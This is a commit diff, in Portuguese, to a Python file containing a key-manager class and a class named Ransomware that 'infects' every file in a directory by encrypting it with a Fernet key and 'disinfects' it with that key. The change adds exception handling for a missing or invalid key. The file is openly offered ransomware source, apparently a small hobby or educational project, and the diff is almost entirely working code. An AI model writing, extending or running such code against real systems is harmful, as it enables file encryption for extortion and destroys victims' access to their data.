adiciona tratamento de excecoes

+++ classes.py
@@ -3,6 +3,7 @@ import os
 from cryptography.fernet import Fernet
 
 from arquivos_utils import escrever_arquivo, ler_arquivo
+from excecoes import ChaveNaoEncontrada, ChaveInvalida
 
 
 class GerenciadorDeChave:
@@ -10,23 +11,28 @@ class GerenciadorDeChave:
         self.caminho_para_chave = caminho_para_chave
 
     def crie_chave(self):
-        if os.path.exists(self.caminho_para_chave):
+        try:
             return self.obtenha_chave()
-
-        chave_criptografia = Fernet.generate_key()
-        escrever_arquivo(self.caminho_para_chave, chave_criptografia)
-        return chave_criptografia
+        except ChaveNaoEncontrada:
+            chave_criptografia = Fernet.generate_key()
+            escrever_arquivo(self.caminho_para_chave, chave_criptografia)
+            return chave_criptografia
 
     def obtenha_chave(self, legivel=False):
-        chave = ler_arquivo(self.caminho_para_chave)
+        if self.chave_existe():
+            chave = ler_arquivo(self.caminho_para_chave)
+            return chave.decode('utf-8') if legivel else chave
 
-        if legivel:
-            return chave.decode('utf-8')
-
-        return chave
+        raise ChaveNaoEncontrada(
+            f'Chave não encontrada em {self.caminho_para_chave}. '
+            'Os arquivos não foram criptografados ou a chave foi removida manualmente.')
 
     def remova_chave(self):
-        os.remove(self.caminho_para_chave)
+        if self.chave_existe():
+            os.remove(self.caminho_para_chave)
+
+    def chave_existe(self):
+        return os.path.exists(self.caminho_para_chave)
 
     @staticmethod
     def converta_para_bytes(chave):
@@ -47,9 +53,15 @@ class Ransomware:
             caminho_arquivo = f'{diretorio}/{nome_arquivo}'
             self.infecte_arquivo(caminho_arquivo)
 
-    def desinfecte_arquivo(self, caminho_para_arquivo, chave, remover_chave=False):
+    def desinfecte_arquivo(self, caminho_para_arquivo, chave_legivel, remover_chave=False):
         conteudo_criptografado = ler_arquivo(caminho_para_arquivo)
-        conteudo = Fernet(chave).decrypt(conteudo_criptografado)
+        chave = self.gerenciador_de_chave.converta_para_bytes(chave_legivel)
+
+        try:
+            conteudo = Fernet(chave).decrypt(conteudo_criptografado)
+        except ValueError:
+            raise ChaveInvalida(f'A chave {chave_legivel} é inválida!')
+
         escrever_arquivo(caminho_para_arquivo, conteudo)
 
         if remover_chave:
